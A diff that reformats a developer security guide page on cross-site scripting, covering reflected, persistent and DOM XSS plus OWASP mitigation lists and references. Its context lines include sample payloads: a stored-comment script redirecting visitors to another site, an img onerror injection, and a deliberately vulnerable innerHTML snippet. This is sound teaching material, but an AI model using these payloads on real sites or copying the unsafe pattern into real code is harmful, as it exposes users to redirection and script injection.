@@ -5,14 +5,13 @@ sidebar_position: 8
 
 # Cross-site scripting (XSS)
 
-
 ## The Attack
 
-<iframe width="100%" height="450"
-src="https://www.youtube.com/embed/L5l9lSnNMxg">
-</iframe>
-
-
+<iframe
+  width='100%'
+  height='450'
+  src='https://www.youtube.com/embed/L5l9lSnNMxg'
+></iframe>
 
 ## Reflected XSS
 
@@ -35,9 +34,7 @@ The victim will open this link and will be redirected to a malicious site with t
 
 Inside the malicious code we can add extra payloads like (ajax calls... )
 
-
 ## persistent XSS
-
 
 ![p-XSS sample workflow](/img/pxss.png)
 _Image from [Christopher Makarem](https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554)_
@@ -61,20 +58,18 @@ POST "http://website.com/blog/post-1/comment", body{"<script>window.location='ht
 
 Any user that visits the website will be vulnerable once this malicious comment is loaded.
 
-
 ## DOM XSS
-
 
 ![DOM-XSS sample workflow](/img/dom_xss.png)
 _Image from [Christopher Makarem](https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd)_
 
-### Keys 
+### Keys
 
 If the attacker controls any input field value, they can easily add malicious values:
 
 ```js
-const search = document.getElementById('search').value;
-document.getElementById('results').innerHTML = `You searched for: ${search}`;
+const search = document.getElementById('search').value
+document.getElementById('results').innerHTML = `You searched for: ${search}`
 ```
 
 ```
@@ -85,7 +80,6 @@ You searched for: <img src=error onerror='/* Evil payload */'>
 
 - [The Telegraph | TweetDeck hack hits BBC and White House accounts](https://www.telegraph.co.uk/technology/twitter/10894635/BBC-and-White-House-accounts-in-TweetDeck-hack.html)
 - [VICE | The MySpace Worm that Changed the Internet Forever](https://www.vice.com/en_us/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever)
-
 
 ## The solution
 
@@ -105,7 +99,6 @@ There are no definitive solutions to avoid this attack but it can be highly miti
 - 6 - Sanitize HTML Markup with a Library Designed for the Job
 - 7 - Avoid JavaScript URL's
 
-
 ### [Keys from OWASP Cheat sheets for DOM XSS](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
 
 - 1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context
@@ -116,15 +109,14 @@ There are no definitive solutions to avoid this attack but it can be highly miti
 - 6 - Populate the DOM using safe JavaScript functions or properties
 - 7 - Fixing DOM Cross-site Scripting Vulnerabilities
 
-
 ### Other
+
 - The [Recommendations for HTTP Headers in this guide](/http_headers/)
 - The [Best practices for Express in this guide](/best_practices/express)
 - The [Best practices for React in this guide](/best_practices/react)
 
-
-
 ### Refs
+
 - [ckarande | Top Overlooked Security Threats to Node.js Web Applications](https://speakerdeck.com/ckarande/top-overlooked-security-threats-to-node-dot-js-web-applications?slide=24)
 - [Scott Smith | Cross Site Scripting (XSS)](http://scottksmith.com/blog/2015/06/22/secure-node-apps-against-owasp-top-10-cross-site-scripting/)
 - [portswigger | Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
